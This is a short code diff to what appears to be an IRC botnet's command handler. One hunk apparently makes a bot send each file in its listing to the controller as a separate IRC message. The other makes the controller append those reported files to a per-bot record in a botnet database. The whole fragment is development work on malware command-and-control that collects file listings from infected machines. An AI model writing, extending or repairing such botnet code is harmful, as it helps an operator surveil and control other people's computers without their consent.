@@ -23,7 +23,8 @@ class CommandHandler:
         irc_connection = args[0]
         nickname = kwargs.get('nickname')
         files = self.list_files()
-        irc_connection.send_query(nickname, f"FILES {files}")
+        for file in files:
+            irc_connection.send_query(nickname, f"FILES: {file}")
 
 
     def irc_onCommandSTAT(self, *args, **kwargs):
@@ -128,14 +129,15 @@ class CommandHandler:
 
     def irc_onCommandFILES(self, *args, **kwargs):
         nickname = kwargs.get('nickname')
-        files = kwargs.get('files')
+        file = kwargs.get('files')
 
         bot = self.botnetDB.get_bot(nickname)
         if bot is None:
             logging.warning(f"Bot not found: nick: {nickname}")
             return
         
-        bot.fileList = files
+        if file not in bot.fileList:
+            bot.fileList.append(file)
         bot.fileListRefreshTime = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 
